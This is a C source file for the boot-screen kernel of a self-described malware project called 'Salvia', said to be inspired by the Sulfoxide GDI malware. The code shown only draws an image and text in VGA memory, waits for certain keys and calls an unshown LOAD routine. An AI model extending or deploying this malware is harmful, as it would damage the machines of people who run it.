#include "Salvia.h"
#include <stdbool.h>
#define SCREEN_WIDTH 80
#define SCREEN_HEIGHT 25
#define KEYBOARD_DATA_PORT 0x60
#define ENTER_KEY 0x1C 

void PRINT(int x, int y, char c, uint8_t color) {
    if (x < 0 || x >= SCREEN_WIDTH || y < 0 || y >= SCREEN_HEIGHT) return;
    VIDEO_MEMORY[y * SCREEN_WIDTH + x] = ((uint16_t)color << 8) | c;
}
static inline void delay_long() {
    for (volatile long i = 0; i < 20000000; i++); 
}

static inline uint8_t INB(uint16_t port) {
    uint8_t ret;
    __asm__ volatile ("inb %1, %0" : "=a"(ret) : "Nd"(port));
    return ret;
}
void PRINT_IMAGE() {
    for (int i = 0; i < SCREEN_WIDTH * SCREEN_HEIGHT; i++) {
        uint8_t c = IMAGE_STRUCT[i];
        uint8_t color = IMAGE_CLS[i];
        uint16_t v = (color << 8) | c;
        VIDEO_MEMORY[i] = v;
    }
}

void TEXT(const char* text, uint8_t color) {
    
    int total_lines = 1;
    for (int i = 0; text[i] != '\0'; i++) {
        if (text[i] == '\n') total_lines++;
    }

    
    const char* lines[50];
    lines[0] = text;
    int line_idx = 1;

    for (int i = 0; text[i] != '\0'; i++) {
        if (text[i] == '\n') {
            lines[line_idx++] = &text[i + 1];
        }
    }

    PRINT_IMAGE();

    int start_y = SCREEN_HEIGHT - total_lines;
    if (start_y < 0) start_y = 0;

    for (int l = 0; l < total_lines; l++) {
        const char* str = lines[l];
        int len = 0;
        while (str[len] != '\0' && str[len] != '\n') len++;

        int start_x = (SCREEN_WIDTH - len) / 2;
        if (start_x < 0) start_x = 0;

        for (int j = 0; j < len; j++) {
            PRINT(start_x + j, start_y + l, str[j], color);
        }
    }
}

void wait_for_enter() {
    while (true) {
        uint8_t scancode = INB(KEYBOARD_DATA_PORT);
        if (
            scancode == ENTER_KEY ||  // Invio
            scancode == 0x31 ||       // n
            scancode == 0x17 ||       // i
            scancode == 0x13 ||       // r
            scancode == 0x12          // e
        ) {
            break;
        }
    }
}
void START() {
    PRINT_IMAGE();
    TEXT(
        "Hello nFire, this malware is inspired\n"
        "by the famous psychedelic Salvia Divinorum\n"
        "(it's the plant you see here)\n"
        " "
        "and from the famous GDI malware named Sulfoxide\n"
        "(made by Wipet in 2022)\n"
        "This malware is made in C#\n"
        "and this screen is a small kernel made in C and assembly\n"
        "Donate 2 euro per nFire.\n"
        "\nPress enter,n,i,r or e to continue...",
        0x04
    );

    wait_for_enter(); 
    LOAD();         
}
